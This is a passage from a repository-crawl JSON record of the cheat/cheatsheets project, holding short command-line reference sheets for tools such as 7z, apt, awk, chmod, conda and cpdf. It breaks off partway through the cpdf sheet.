{
  "metadata": {
    "timestamp": 1736568458652,
    "page": 429,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjQzOQ==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "cheat/cheatsheets",
      "stars": 1856,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": "7z",
          "type": "blob",
          "size": 1.513671875,
          "content": "---\ntags: [ compression ]\n---\n7z [Args] [archive.7z] [files / folders to archive]\nA file archiver with highest compression ratio\n\nArgs:\na       add\nd       delete\ne       extract\nl       list\nt       test\nu       update\nx       extract with full paths\n\n    DO NOT USE the 7-zip format for backup purpose on Linux/Unix.\n    7-zip does not store the owner/group of the file.\n\n    On Linux/Unix, in order to backup directories you must use tar :\n      - to backup a directory  : tar cf - directory | 7z a -si directory.tar.7z\n      - to restore your backup : 7z x -so directory.tar.7z | tar xf -\n\n    If  you  want  to send files and directories (not the owner of file) to others\n    Unix/MacOS/Windows users, you can use the 7-zip format.\n\nExample 1: Quick and Easy - Add all files in dir1 to archive.7z with Default Settings.\n7z a archive.7z  dir1\n\nExample 2: Add all files in dir1 to archive.7z with Max Compression\n7z a -t7z -m0=lzma -mx=9 -mfb=64 -md=32m -ms=on archive.7z dir1\n\n    -t7z        7z archive\n    -m0=lzma    lzma method\n    -mx=9       level of compression = 9 (ultra)\n    -mfb=64     number of fast bytes for lzma = 64\n    -md=32m     dictionary size = 32 Mb\n    -ms=on      solid archive = on\n\nExample 3: Add (store) all files in dir1 to archive.7z with No Compression\n7z a -m0=copy archive.7z dir1\n\n7z exit codes:\n\n    0       normal (no errors or warnings)\n    1       warning (non-fatal errors)\n    2       fatal error\n    7       bad cli arguments\n    8       not enough memory for operation\n    255     process was interrupted\n"
        },
        {
          "name": "ab",
          "type": "blob",
          "size": 0.1826171875,
          "content": "# To send 100 requests with a concurency of 50 requests to a URL:\nab -n 100 -c 50 <url>\n\n# To send requests for 30 seconds with a concurency of 50 requests to a URL:\nab -t 30 -c 50 <url>\n"
        },
        {
          "name": "acl",
          "type": "blob",
          "size": 0.6455078125,
          "content": "# Get ACL\ngetfacl <file>\n\n# Add or modify ACL on file\nsetfacl -m u:username:rX <file>\nsetfacl -m g:groupname:rw <file>\nsetfacl -m o::- <file>\n\n# or provide all permissions at once\nsetfacl -m u::rwx,g:groupname:rX,o::- <file>\n\n# Copy ACL from file-A to file-B\ngetfacl file-A | setfacl -M - file-B\n\n# Apply ACL recursivelly to directory\nsetfacl -R -m u:username:rX <directory>\n\n# Delete ACL\nsetfacl -x u:username,g:groupname <file>\n\n# Delete all ACL on file, including default\nsetfacl -b <file>\n\n# Same operations works for default ACLs\nsetfacl -m d:u:username:rx <directory>\nsetfacl -x d:u:username <directory>\n\n# Delete only default ACLs\nsetfacl -k <directory>\n"
        },
        {
          "name": "ag",
          "type": "blob",
          "size": 0.2734375,
          "content": "# To exclude a directory from a search:\nag <phrase> --ignore-dir=<dir>\n\n# To exclude a file from a search:\nag <phrase> --ignore=<file>\n\n# To force colorization:\nag <phrase> --color | less -R\n\n# To search for <phrase> in files whose names match <pattern>:\nag <phrase> -G <pattern>\n"
        },
        {
          "name": "alias",
          "type": "blob",
          "size": 0.1279296875,
          "content": "# To show a list of your current shell aliases:\nalias\n\n# To alias `ls -l` to `ll`:\nalias ll='ls -l'\n\n# To remove alias:\nunalias ll\n"
        },
        {
          "name": "ansi",
          "type": "blob",
          "size": 1.9013671875,
          "content": "# Reset\nColor_Off='\\e[0m'       # Text Reset\n\n# Regular Colors\nBlack='\\e[0;30m'        # Black\nRed='\\e[0;31m'          # Red\nGreen='\\e[0;32m'        # Green\nYellow='\\e[0;33m'       # Yellow\nBlue='\\e[0;34m'         # Blue\nPurple='\\e[0;35m'       # Purple\nCyan='\\e[0;36m'         # Cyan\nWhite='\\e[0;37m'        # White\n\n# Bold\nBBlack='\\e[1;30m'       # Black\nBRed='\\e[1;31m'         # Red\nBGreen='\\e[1;32m'       # Green\nBYellow='\\e[1;33m'      # Yellow\nBBlue='\\e[1;34m'        # Blue\nBPurple='\\e[1;35m'      # Purple\nBCyan='\\e[1;36m'        # Cyan\nBWhite='\\e[1;37m'       # White\n\n# Underline\nUBlack='\\e[4;30m'       # Black\nURed='\\e[4;31m'         # Red\nUGreen='\\e[4;32m'       # Green\nUYellow='\\e[4;33m'      # Yellow\nUBlue='\\e[4;34m'        # Blue\nUPurple='\\e[4;35m'      # Purple\nUCyan='\\e[4;36m'        # Cyan\nUWhite='\\e[4;37m'       # White\n\n# Background\nOn_Black='\\e[40m'       # Black\nOn_Red='\\e[41m'         # Red\nOn_Green='\\e[42m'       # Green\nOn_Yellow='\\e[43m'      # Yellow\nOn_Blue='\\e[44m'        # Blue\nOn_Purple='\\e[45m'      # Purple\nOn_Cyan='\\e[46m'        # Cyan\nOn_White='\\e[47m'       # White\n\n# High Intensity\nIBlack='\\e[0;90m'       # Black\nIRed='\\e[0;91m'         # Red\nIGreen='\\e[0;92m'       # Green\nIYellow='\\e[0;93m'      # Yellow\nIBlue='\\e[0;94m'        # Blue\nIPurple='\\e[0;95m'      # Purple\nICyan='\\e[0;96m'        # Cyan\nIWhite='\\e[0;97m'       # White\n\n# Bold High Intensity\nBIBlack='\\e[1;90m'      # Black\nBIRed='\\e[1;91m'        # Red\nBIGreen='\\e[1;92m'      # Green\nBIYellow='\\e[1;93m'     # Yellow\nBIBlue='\\e[1;94m'       # Blue\nBIPurple='\\e[1;95m'     # Purple\nBICyan='\\e[1;96m'       # Cyan\nBIWhite='\\e[1;97m'      # White\n\n# High Intensity backgrounds\nOn_IBlack='\\e[0;100m'   # Black\nOn_IRed='\\e[0;101m'     # Red\nOn_IGreen='\\e[0;102m'   # Green\nOn_IYellow='\\e[0;103m'  # Yellow\nOn_IBlue='\\e[0;104m'    # Blue\nOn_IPurple='\\e[0;105m'  # Purple\nOn_ICyan='\\e[0;106m'    # Cyan\nOn_IWhite='\\e[0;107m'   # White\n"
        },
        {
          "name": "ansible",
          "type": "blob",
          "size": 0.1884765625,
          "content": "---\ntags: [ orchestration ]\n---\n# To run a command on multiple instances at once - using `servers` group from `inventory.yml`:\nansible -u ansible -i inventory.yml servers -m shell -a \"ls /var\"\n"
        },
        {
          "name": "ansible-galaxy",
          "type": "blob",
          "size": 0.43359375,
          "content": "---\ntags: [ orchestration ]\n---\n# To install a role:\nansible-galaxy install <user>.<role>\n\n# To remove a role:\nansible-galaxy remove <user>.<role>\n\n# To list installed roles:\nansible-galaxy list\n\n# To search for a given role:\nansible-galaxy search <role>\n\n# To create a new role:\nansible-galaxy init <role>\n\n# To get the information for the role # or a collection if you replace `role` with `collection`:\nansible-galaxy role info <user>.<role>\n"
        },
        {
          "name": "ansible-vault",
          "type": "blob",
          "size": 0.171875,
          "content": "---\ntags: [ orchestration ]\n---\n# To enncrypt string using keyfile `backup_encryption_key`:\nansible-vault encrypt_string 'SupersecretPa$$phrase' --name 'backup_encryption_key'\n"
        },
        {
          "name": "apachectl",
          "type": "blob",
          "size": 0.09375,
          "content": "---\ntags: [ apache, httpd ]\n---\n# To test Apache configuration file syntax\napachectl configtest\n"
        },
        {
          "name": "apk",
          "type": "blob",
          "size": 0.2216796875,
          "content": "---\ntags: [ packaging ]\n---\n# To install a package:\napk add <package>\n\n# To remove a package:\napk del <package>\n\n# To update repos:\napk update\n\n# To upgrade  all packages:\napk upgrade\n\n# To find a package:\napk search <package>\n"
        },
        {
          "name": "apparmor",
          "type": "blob",
          "size": 0.599609375,
          "content": "# apparmor will protect a system by confining programs to a limited set of resources.\n\n# To activate a profile:\nsudo aa-enforce usr.bin.firefox\n# or\nexport _PROFILE_='usr.bin.firefox' sudo $(rm /etc/apparmor.d/disable/$_PROFILE_ ; cat /etc/apparmor.d/$_PROFILE_ | apparmor_parser -a )\n\n# To disable a profile:\nsudo aa-disable usr.bin.firefox\n# or\nexport _PROFILE_='usr.bin.firefox' sudo $(ln -s /etc/apparmor.d/$_PROFILE_ /etc/apparmor.d/disable/ && apparmor_parser -R /etc/apparmor.d/$_PROFILE_)\n\n# To list profiles loaded:\nsudo aa-status\n# or\nsudo apparmor_status\n\n# List of available profiles: /etc/apparmor.d/\n"
        },
        {
          "name": "apt",
          "type": "blob",
          "size": 0.89453125,
          "content": "---\ntags: [ packaging ]\n---\n# To find packages matching <phrase>:\napt search <phrase>\n\n# To show information on a package:\napt show <package>\n\n# To fetch package list:\napt update\n\n# To download and install the updates and (UNLIKE apt-get) install new necessary packages:\napt upgrade\n\n# To download and install the updates AND install new necessary packages\n# AND remove packages that stand in the way of the upgrade - use with caution:\napt dist-upgrade\n\n# To perform a full system upgrade:\napt update && apt upgrade # use dist-upgrade carefully if needed\n\n# To install package(s):\napt install <package>...\n\n# To uninstall package(s):\napt remove <package>...\n\n# To remove automatically all unused packages:\napt autoremove\n\n# To list dependencies of a package:\napt depends <package>...\n\n# To remove packages and delete their config files:\napt purge <package>...\n\n# To list all packages installed:\napt list --installed\n"
        },
        {
          "name": "apt-cache",
          "type": "blob",
          "size": 0.486328125,
          "content": "---\ntags: [ packaging ]\n---\n# To find packages matching <phrase>:\napt-cache search <phrase>\n\n# To display package records for the named package(s):\napt-cache show <package>...\n\n# To display reverse dependencies of a package:\napt-cache rdepends <package>\n\n# To display package versions, reverse dependencies and forward dependencies of\n# a package:\napt-cache showpkg <package>\n\n# To display package installation status and what version is available from\n# its repository:\napt-cache policy <package>\n"
        },
        {
          "name": "apt-get",
          "type": "blob",
          "size": 0.86328125,
          "content": "---\ntags: [ packaging ]\n---\n# To fetch package list:\napt-get update\n\n# To download and install package updates:\napt-get upgrade\n\n# To download and install the updates AND install new necessary packages\n# AND remove any packages that stand in the way of the upgrade:\napt-get dist-upgrade\n\n# Full command:\napt-get update && apt-get dist-upgrade\n\n# To install a new package(s):\napt-get install <package>...\n\n# To download a package without installing it. (The package will be downloaded in your current working dir)\napt-get download <package>\n\n# To change cache dir and archive dir (where .deb are stored):\napt-get -o Dir::Cache=\"/path/to/destination/dir/\" -o Dir::Cache::archives=\"./\" install ...\n\n# To show apt-get installed packages:\ngrep 'install ' /var/log/dpkg.log\n\n# To silently keep old configuration during batch updates:\napt-get update -o DPkg::Options::='--force-confold' ...\n"
        },
        {
          "name": "aptitude",
          "type": "blob",
          "size": 0.3291015625,
          "content": "---\ntags: [ packaging ]\n---\n# To find packages matching <phrase>:\naptitude search <phrase>\n\n# To display package records for the named package(s):\naptitude show <package>...\n\n# To install package(s):\naptitude install <package>...\n\n# To remove package(s):\naptitude remove <package>...\n\n# To remove unnecessary package:\naptitude autoclean\n"
        },
        {
          "name": "aria2c",
          "type": "blob",
          "size": 0.3740234375,
          "content": "# To download a file:\n# The url can be a http(s), ftp, .torrent file or even a magnet link\naria2c <url>\n\n# To prevent downloading the .torrent file:\naria2c --follow-torrent=mem <url>\n\n# Download 1 file at a time (-j)\n# continuing (-c) any partially downloaded ones\n# to the directory specified (-d)\n# reading urls from the file (-i):\naria2c -j 1 -c -d ~/Downloads -i </path/to/file>\n"
        },
        {
          "name": "asciiart",
          "type": "blob",
          "size": 0.490234375,
          "content": "# To show some text in ASCII Art:\n\nfiglet Cheat\n#  ____ _                _\n# / ___| |__   ___  __ _| |_\n#| |   | '_ \\ / _ \\/ _` | __|\n#| |___| | | |  __/ (_| | |_\n# \\____|_| |_|\\___|\\__,_|\\__|\n#\n\n\n# To have some text with color and other options:\n# Show with a border\ntoilet -F border Cheat\n# Basic show (filled)\ntoilet Cheat\n#   mmm  #                      m\n# m\"   \" # mm    mmm    mmm   mm#mm\n# #      #\"  #  #\"  #  \"   #    #\n# #      #   #  #\"\"\"\"  m\"\"\"#    #\n#  \"mmm\" #   #  \"#mm\"  \"mm\"#    \"mm\n#\n"
        },
        {
          "name": "asciidoctor",
          "type": "blob",
          "size": 2.2421875,
          "content": "# headers\n= h1 header\n== h2 header\n\n\n# blocks\n[quote, Somebody, Who is somebody]\n____\nQuote something\n____\n//\nNOTE: Some note\n//\n[WARNING]\n====\nSome warning\n====\n\n# lists\n.Un-ordered list with a title\n* list item\n** sub-list item\n- hypen as sub-sub-list item\n+\nthat continues at the next line\n- {blank}\n+\n----\ncomplex content of an item\n----\n\n[%reversed,start=4]\n.Ordered list; reversed, started at 4\n. ordered list item\n.. ordered list sub-item\n. another list item\n\n# separating adjacent lists (surrounded by blank lines)\n//-\n\n# checklist\n- [*] checked\n- [x] also checked\n- [ ] not checked\n\nDescription list item:: definition\n[horizontal]\nDescription list item #2:: definition\n\n\n# links\nAutomatic link http://example.com or\nhttp://example.com[link with title and attributes,role=external,window=_blank]\nlink:../README.adoc[Relative link to open the README file]\n\n\n# cross reference links\n[[an-anchor]]inline anchor, [#other-anchor]#applied to a phrase#\nReference to <<an-anchor>> or to <<other-anchor,the other anchor>>\n\n\n# image\nimage:image.png[Alt text, title=\"Inline image\"]\n\n.Block image title\n[caption=\"Figure 1: \",link=http://example.com/image.png]\nimage::image.jpg[Alt text, 300, 200]\n\n\n# code\n....\nliteral block\n....\n\n:variable: 123\n.Source code title\n[source,asciidoc,subs=\"+quotes,attributes+\",options=\"nowrap\"]\n----\n:toc: right  # <1>\n// with var substitution (attributes+)\n:variable: definition, the value is {variable}\n// with the markup substitution (+quotes)\n// no wrapping long lines (nowrap)\n----\n<1> Asciidoctor sytax for the table of content\n\n# include source code, stripping indentation\n[source,asciidoc,indent=0]\n----\ninclude::doc/document.adoc[lines=5..10]\n----\n\n# formatting\n*bold*, **un**constrained\n_italic_, __un__constrained\n`monospace`, ``un``constrained\n`[underline]#Underline text#`\n`[overline]#overline text#`\n`[line-through]#strikethrough#`\n`[blue line-through]*bold blue and line-through*.`\n\n# comment\n// text in the comment\n\n# horizontal rules (hr)\n'''\n\nNon-breaking space {nbsp}\nBreak at the end of +\nline\n\n# tables\n.Table title\n[caption=\"Table 2: \"]\n|===\n| Name | Description\n//\n| Asciidoctor\n| Awesome way to write documentation\n//\n2+| This cell spans 2 columns\n//\n.2+| This cell spans 2 rows\n//\n| Line at the side of the spanned rows\n| Another line\n//\n|===\n"
        },
        {
          "name": "asterisk",
          "type": "blob",
          "size": 0.515625,
          "content": "# To connect to a running Asterisk session:\nasterisk -rvvv\n\n# To issue a command to Asterisk from the shell:\nasterisk -rx \"<command>\"\n\n# To originate an echo call from a SIP trunk on an Asterisk server, to a specified number:\nasterisk -rx \"channel originate SIP/<trunk>/<number> application echo\"\n\n# To print out the details of SIP accounts:\nasterisk -rx \"sip show peers\"\n\n# To print out the passwords of SIP accounts:\nasterisk -rx \"sip show users\"\n\n# To print out the current active channels:\nasterisk -rx \"core show channels\"\n"
        },
        {
          "name": "at",
          "type": "blob",
          "size": 0.251953125,
          "content": "# To schedule a one time task:\nat <time>\n<command 0>...\nCtrl-d\n\n# <time> can be either\nnow | midnight | noon | teatime (4pm)\nHH:MM\nnow + N <minutes | hours | days | weeks>\nMM/DD/YY\n\n# To list pending jobs:\natq\n\n# To remove a job (use id from atq):\natrm <id>\n"
        },
        {
          "name": "auditd",
          "type": "blob",
          "size": 0.6240234375,
          "content": "---\ntags: [ security ]\n---\n\n## auditd\n# To start/restart/stop auditd\nservice auditd start/restart/stop\n\n# To list active audit rules\nauditctl -l\n\n# To create a watch rule for a file for audit purposes temporarily\nauditctl -w <File to watch> -p <permission r/w/x/a> -k <Identifier>\n\n# To make watch rules permanently\nvim /etc/audit/rules.d/audit.rules\n# and append with following syntax\n-w <File to watch> -p <permission r/w/x/a> -k <Identifier>\n# Reload the service with\nservice auditd reload\n\n\n## Filtering and Searching\n# To search after a identifier\nausearch -i -k <Identifier>\n\n# To create a report and get the options\naureport --help\n"
        },
        {
          "name": "awk",
          "type": "blob",
          "size": 0.7529296875,
          "content": "# To sum integers from a file or stdin, one integer per line:\nprintf '1\\n2\\n3\\n' | awk '{ sum += $1} END {print sum}'\n\n# To use a specific character as separator to sum integers from a file or stdin:\nprintf '1:2:3' | awk -F \":\" '{print $1+$2+$3}'\n\n# To print a multiplication table:\nseq 9 | sed 'H;g' | awk -v RS='' '{for(i=1;i<=NF;i++)printf(\"%dx%d=%d%s\", i, NR, i*NR, i==NR?\"\\n\":\"\\t\")}'\n\n# To specify an output separator character:\nprintf '1 2 3' | awk 'BEGIN {OFS=\":\"}; {print $1,$2,$3}'\n\n# To execute commands only on rows that satisfy a certain condtion\nprintf \"george jetson\\nolive oyl\\nbeetle bailey\" | awk '$2==\"bailey\"{print $0}'\n#\n# To execute commands only on matching rows using regex\nprintf \"george jetson\\nolive oyl\\nbeetle bailey\" | awk '/ley$/{print $0}'\n"
        },
        {
          "name": "bash",
          "type": "blob",
          "size": 0.53515625,
          "content": "# To implement a for loop:\nfor file in *;\ndo \n    echo $file found;\ndone\n\n# To implement a case command:\ncase \"$1\"\nin\n    0) echo \"zero found\";;\n    1) echo \"one found\";;\n    2) echo \"two found\";;\n    3*) echo \"something beginning with 3 found\";;\nesac\n\n# To turn on debugging:\nset -x\n\n# To turn off debugging:\nset +x\n\n# Retrieve N-th piped command exit status:\nprintf 'foo' | fgrep 'foo' | sed 's/foo/bar/'\necho ${PIPESTATUS[0]}  # replace 0 with N\n\n# To create a lockfile:\n( set -o noclobber; echo > my.lock ) || echo 'Failed to create lock file'\n"
        },
        {
          "name": "bat",
          "type": "blob",
          "size": 0.3154296875,
          "content": "# Display a single file on the terminal:\nbat <file>\n\n# Display multiple files at once:\nbat <file> <file>\n\n# Show and highlight non-printable characters:\nbat -A <file>\n\n# Display all supported languages:\nbat --list-languages\n\n# Set the language for syntax highlighting:\nbat --language <language> <file.<language extension>>\n"
        },
        {
          "name": "black",
          "type": "blob",
          "size": 0.2646484375,
          "content": "---\nsyntax: bash\ntags: [ python, development ]\n---\n# Formats the python code of the specified file or directory:\nblack <path>\n\n# Checks if the code is already well-formatted:\nblack --check <path>\n\n# Show the changes that would be applied to the code:\nblack --diff <path>\n"
        },
        {
          "name": "bosh",
          "type": "blob",
          "size": 1.3330078125,
          "content": "---\ntags: [ bosh ]\n---\n# To list all BOSH deployments by name:\nbosh deps --column=name\n\n# To list a BOSH deployment's VMs, showing vital resource usage\nbosh -d <deployment> vms --vitals\n\n# To SSH into a BOSH deployment VM:\nbosh -d <deployment> ssh <instance-group>/(<instance-guid>|<instance-index>)\n\n# To run a shell command, via SSH, on all BOSH deployment VMs of an instance group:\nbosh -d <deployment> ssh <instance-group> -c '<shell-command>'\n\n# To list a BOSH deployment's errands:\nbosh -d <deployment> errands\n\n# To run a BOSH deployment errand\n# .. on all VMs that have colocated errand:\nbosh -d <deployment> run-errand <errand-name>\n# .. on a specific VM:\nbosh -d <deployment> run-errand <errand-name> --instance <instance-group>/(<instance-guid> | <instance-index>)\n\n# To list a BOSH deployment's tasks:\nbosh -d <deployment> tasks\nbosh -d <deployment> tasks --recent\n\n# To show a BOSH deployment's task status and start tracking its output:\nbosh -d <deployment> task <task-id>\n\n# To recreate a BOSH deployment's VM\n# .. safely drained and to last successful deployment state:\nbosh -d <deployment> recreate <instance-group>/(<instance-guid>|<instance-index>)\n# .. aggressively removed, ignoring bad agents and to current deployment state:\nbosh -d <deployment> recreate --skip-drain --fix --no-converge <instance-group>/(<instance-guid> | <instance-index>)\n"
        },
        {
          "name": "bower",
          "type": "blob",
          "size": 0.599609375,
          "content": "---\ntags: [ packaging ]\n---\n# To install a package:\nbower install <package>\n\n# To install a package from github:\nbower install <user>/<repo>\n\n# To install a specific package locally:\nbower install <package>#<version>\n\n# To install a package locally and save installed package into bower.json:\nbower install <package> --save\n\n# To retrieve info of a particular package:\nbower info <package>\n\n# To list local packages:\nbower list\n\n# To search for a package by name:\nbower search <package>\n\n# To update a package to their newest version:\nbower update <package>\n\n# To remove a local package:\nbower uninstall <package>\n"
        },
        {
          "name": "brew",
          "type": "blob",
          "size": 0.3466796875,
          "content": "---\nsyntax: bash\ntags: [ mac, deps ]\n---\n# Update\nbrew update\n\n# Upgrade everything\nbrew upgrade\n\n# Upgrade specific formula\nbrew upgrade <formula>\n\n# Install formula\nbrew install <formula>\n\n# Install cask\nbrew install --cask <formula>\n\n# Uninstall\nbrew uninstall <formula>\n\n# List installed formulae\nbrew list\n\n# Fix\nbrew doctor\n\n# Clean up\nbrew cleanup\n"
        },
        {
          "name": "bzip2",
          "type": "blob",
          "size": 0.2421875,
          "content": "---\ntags: [ compression ]\n---\n# To compress a file (foo -> foo.bz2):\nbzip2 -z foo\n\n# To decompress a file (foo.bz2 -> foo)\nbzip2 -d foo.bz2\n\n# To compress foo to stdout:\nbzip2 -zc foo > foo.bz2\n\n# To decompress foo.bz2 to stdout:\nbzip2 -dc foo.bz2\n"
        },
        {
          "name": "cat",
          "type": "blob",
          "size": 0.1865234375,
          "content": "# To display the contents of a file:\ncat <file>\n\n# To display file contents with line numbers\ncat -n <file>\n\n# To display file contents with line numbers (blank lines excluded)\ncat -b <file>\n"
        },
        {
          "name": "cd",
          "type": "blob",
          "size": 0.359375,
          "content": "# Go to the given directory:\ncd path/to/directory\n\n# Go to home directory of current user:\ncd\n\n# Go up to the parent of the current directory:\ncd ..\n\n# Go to the previously chosen directory:\ncd -\n\n# Go to a physical dir instead of default -L:\ncd -P path/to/dir\n\n# Some people alias cd=\"cd -P\" and pwd=\"pwd -P\"\n# So that `ls ..` and `cd ..; ls .` yield the same thing.\n"
        },
        {
          "name": "cheat",
          "type": "blob",
          "size": 0.2333984375,
          "content": "# To see example usage of a program:\ncheat <command>\n\n# To edit a cheatsheet\ncheat -e <command>\n\n# To list available cheatsheets\ncheat -l\n\n# To search available cheatsheets\ncheat -s <command>\n\n# To get the current `cheat' version\ncheat -v\n"
        },
        {
          "name": "chmod",
          "type": "blob",
          "size": 1.1162109375,
          "content": "# Add execute for all (myscript.sh)\nchmod a+x myscript.sh\n\n# Set user to read/write/execute, group/global to read only (myscript.sh), symbolic mode\nchmod u=rwx, go=r myscript.sh \n\n# Remove write from user/group/global (myscript.sh), symbolic mode\nchmod a-w myscript.sh\n\n# Remove read/write/execute from user/group/global (myscript.sh), symbolic mode\nchmod = myscript.sh\n\n# Set user to read/write and group/global read (myscript.sh), octal notation\nchmod 644 myscript.sh\n\n# Set user to read/write/execute and group/global read/execute (myscript.sh), octal notation\nchmod 755 myscript.sh\n\n# Set user/group/global to read/write (myscript.sh), octal notation\nchmod 666 myscript.sh\n\n# Roles\nu - user (owner of the file)\ng - group (members of file's group)\no - global (all users who are not owner and not part of group)\na - all (all 3 roles above)\n\n# Numeric representations\n7 - full (rwx)\n6 - read and write (rw-)\n5 - read and execute (r-x)\n4 - read only (r--)\n3 - write and execute (-wx)\n2 - write only (-w-)\n1 - execute only (--x)\n0 - none (---)\n\n# Delete ACL number 0 (MacOS):\n# See: `man -M /usr/share/man chmod`\n/bin/chmod -a# 0 /path/to/file\n"
        },
        {
          "name": "chown",
          "type": "blob",
          "size": 0.365234375,
          "content": "# Change a file's owner:\nchown <user> <file>\n\n# Change a file's owner and group:\nchown <user>:<group> <file>\n\n# Set user to match group value\nchown <user>: <file>\n\n# Set group to match user value\nchown :<group> <file>\n\n# Change a directory's owner recursively:\nchown -R <user> <directory>\n\n# Change ownership to match another file:\nchown --reference=<reference-file> <file>\n"
        },
        {
          "name": "cmp",
          "type": "blob",
          "size": 0.6337890625,
          "content": "---\nsyntax: bash\n---\n# To output the byte and line number of the first difference found between two files:\ncmp <path/to/file_1> <path/to/file_2>\n\n# To output the first differing char between two files:\ncmp -b <path/to/file_1> <path/to/file_2>\n\n# To output every difference between two files:\ncmp -b --verbose <path/to/file_1> <path/to/file_2>\n\n# To compare two files starting after the first 100 bytes:\ncmp -i 100 <path/to/file_1> <path/to/file_2>\n\n# To limit to 200 the number of bytes to compare:\ncmp -n 200 <path/to/file_1> <path/to/file_2>\n\n# To compare two files with no output - only exit status:\ncmp --quiet <path/to/file_1> <path/to/file_2>\n"
        },
        {
          "name": "comm",
          "type": "blob",
          "size": 0.2529296875,
          "content": "# Print lines appearing in both <file-1> and <file-2>:\ncomm -12 <(sort file1.csv) <(sort file2.csv)\n\n# Print lines appearing only in <file-1>:\ncomm -23 <file-1> <file-2>\n\n# For diffing CSVs from a database, consider:\n# https://aswinkarthik.github.io/csvdiff/\n"
        },
        {
          "name": "conda",
          "type": "blob",
          "size": 0.986328125,
          "content": "---\ntags: [ packaging ]\n---\n# To list environments\nconda env list\n\n# To initialise an environment\nconda create --name <environment_name>\n\n# To initialise an environment with python3.10 \nconda create --name <environment_name> python=3.10\n\n# To install from a file\nconda install --file <requirements.txt>\n\n# To clone an environment\nconda create --clone <old_environment_name> --name <new_environment_name>\n\n# To activate a virtual environment\nconda activate <environment_name>\n\n# To deactivate a virtual environment\nconda deactivate\n\n# To remove an environment\nconda env remove --name <environment_name>\n# or\nconda env remove --prefix <path/to/env>\n\n# To list all packages in an environment\nconda list --name <environment_name>\n\n# To list packages in an activated environment\nconda list\n\n# To export an activated environment\nconda env export > <environment.yml>\n\n# To export an activated environment, listing only manually installed packages (no dependencies)\nconda env export --from-history > <environment.yml>\n"
        },
        {
          "name": "convert",
          "type": "blob",
          "size": 0.9580078125,
          "content": "# To convert a file from jpg to pdf\nconvert original.jpg converted.pdf\n\n# To resize an image to a fixed width and proportional height:\nconvert original.jpg -resize 100x converted.jpg\n\n# To resize an image to a fixed height and proportional width:\nconvert original.jpg -resize x100 converted.jpg\n\n# To resize an image to a fixed width and height:\nconvert original.jpg -resize 100x100 converted.jpg\n\n# To resize an image and simultaneously change its file type:\nconvert original.jpg -resize 100x converted.png\n\n# To resize all of the images within a directory:\nfor file in `ls original/image/path/`;\n    do new_path=${file%.*};\n    new_file=`basename $new_path`;\n    convert $file -resize 150 converted/image/path/$new_file.png;\ndone\n\n# To convert an N page pdf to N images (will autonumber):\nconvert -density 150 arch1.pdf -quality 80 'output.jpg'\n\n# To convert an N page pdf to N images with explicit filename formatting:\nconvert -density 150 arch1.pdf -quality 80 'output-%d.jpg'\n"
        },
        {
          "name": "cp",
          "type": "blob",
          "size": 0.6103515625,
          "content": "# To copy a file:\ncp ~/Desktop/foo.txt ~/Downloads/foo.txt\n\n# To copy a directory:\ncp -r ~/Desktop/cruise_pics/ ~/Pictures/\n\n# To create a copy but ask to overwrite if the destination file already exists:\ncp -i ~/Desktop/foo.txt ~/Documents/foo.txt\n\n# To create a backup file with date:\ncp foo.txt{,.\"$(date +%Y%m%d-%H%M%S)\"}\n\n# To copy a symlink that points to a directory (and is thus soft) and not\n# 'expand' the symlink (aka, preserve its nature as a symlink):\n# Note this does NOT work (note trailing '/'):  cp -P /path/to/symlink-dir/\ncp -P <symlink-dir> <dest-dir>\n\n# To copy sparsely:\ncp --sparse=always <src> <dest>\n"
        },
        {
          "name": "cpan",
          "type": "blob",
          "size": 0.7705078125,
          "content": "---\ntags: [ perl ]\n---\n# install one or more modules\ncpan <Some::Module> [Another::Module]\n\n# force install a module\ncpan -fi <Some::Module>\n\n# install a module in local::lib\ncpan -I <Some::Module>\n\n# install a module while skipping all tests\ncpan -T <Some::Module>\n\n# see a module changes, without installing it\ncpan -C <Some::Module>\n\n# see a module's details, without installing it\ncpan -D <Some::Module>\n\n# list close matches to a module's name\ncpan -x <Some::Mdule>\n\n# download a distro, without installing it\ncpan -g <Some::Module>\n\n# list all installed modules with their versions\ncpan -l <Some::Module>\n\n# create a CPAN Autobundle\ncpan -a\n\n# install the module in the current distro directory\ncpan .\n\n# start the CPAN shell\ncpan\ncpan -s\n\n# read the complete cpan docs\nperldoc cpan\n"
        },
        {
          "name": "cpanm",
          "type": "blob",
          "size": 0.716796875,
          "content": "---\ntags: [ perl ]\n---\nsee https://github.com/miyagawa/cpanminus\n\n# install Some::Module\ncpanm <Some::Module>\n\n# install from CPAN distribution path, like AUTHOR/Some-Module-1.00.tar.gz\ncpanm <cpan-repo-path>\n\n# install from URL\ncpanm <URL-to-distro-file>\n\n# install from a local file\ncpanm <path-to-distro-file>\n\n# Configure interactively\ncpanm --interactive <Some::Module>\n\n# install from local directory\ncpanm .\n\n# install all the deps for the current directory\ncpanm --installdeps .\n\n# install Some::Module and all non-core deps into extlib\ncpanm -L extlib <Some::Module>\n\n# use the fast-syncing mirror\ncpanm --mirror <mirror-url> <Some::Module>\n\n# use only the HTTPS mirror\ncpanm --from https://some.mirror.host/ <Some::Module>\n\n"
        },
        {
          "name": "cpdf",
          "type": "blob",
          "size": 4.482421875,
          "content": "# Read in.pdf, select pages 1, 2, 3 and 6, and write those pages to\n# out.pdf\ncpdf in.pdf 1-3,6 -o out.pdf\n\n# Select the even pages (2, 4, 6...) from in.pdf and write those pages\n# to out.pdf\ncpdf in.pdf even -o out.pdf\n\n# Using AND to perform several operations in order, here merging two\n# files together and adding a copyright stamp to every page.\ncpdf -merge in.pdf in2.pdf AND -add-text \"Copyright 2014\" -o out.pdf\n\n# Read control.txt and use its contents as the command line arguments\n# for cpdf.\ncpdf -control control.txt\n\n# Merge in.pdf and in2.pdf into one document, writing to out.pdf.\ncpdf -merge in.pdf in2.pdf -o out.pdf\n\n# Split in.pdf into ten-page chunks, writing them to Chunk001.pdf,\n# Chunk002.pdf etc\ncpdf -split in.pdf -o Chunk%%%.pdf -chunk 10\n\n# Split in.pdf on bookmark boundaries, writing each to a file whose\n# name is the bookmark label\ncpdf -split-bookmarks 0 in.pdf -o @N.pdf\n\n# Scale both the dimensions and contents of in.pdf by a factor of two\n# in x and y directions.\ncpdf -scale-page \"2 2\" in.pdf -o out.pdf\n\n# Scale the pages in in.pdf to fit the US Letter page size, writing to\n# out.pdf\ncpdf -scale-to-fit usletterportrait in.pdf -o out.pdf\n\n# Shift the contents of the page by 26 pts in the x direction, and 18\n# millimetres in the y 